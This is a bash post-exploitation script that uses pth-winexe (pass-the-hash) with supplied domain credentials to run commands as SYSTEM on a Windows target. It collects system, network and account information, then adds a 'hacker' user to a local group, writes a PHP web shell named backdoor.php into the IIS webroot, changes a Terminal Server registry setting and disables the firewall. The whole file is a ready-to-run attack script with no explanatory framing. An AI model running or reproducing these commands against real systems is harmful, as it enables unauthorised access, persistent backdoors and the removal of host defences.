#!/bin/bash
# bash pth-winex_post.sh DOMAIN user password 10.1.1.1
DOMAIN=$1
USERNAME=$2
PASSWORD=$3
TARGET=$4
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "systeminfo"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "whoami /all"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "ipconfig /all"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "netstat -ano"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net accounts"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net localgroup USERNAMEs"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net share"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net view"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "powershell.exe -command Get-Hotfix"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net user hacker PASSWORD /add"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net localgroup USERNAMEs /add hacker"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "net group 'DOMAIN Admins' /DOMAIN"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "echo ^< ?php echo passthru($_GET['cmd']); ?^> > C:\inetpub\wwwroot\backdoor.php"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fAllowToGetHelp /t REG_DWORD /d 1 /f"
pth-winexe -U $DOMAIN/$USERNAME%$PASSWORD --system //$TARGET "netsh firewall set opmode disable"
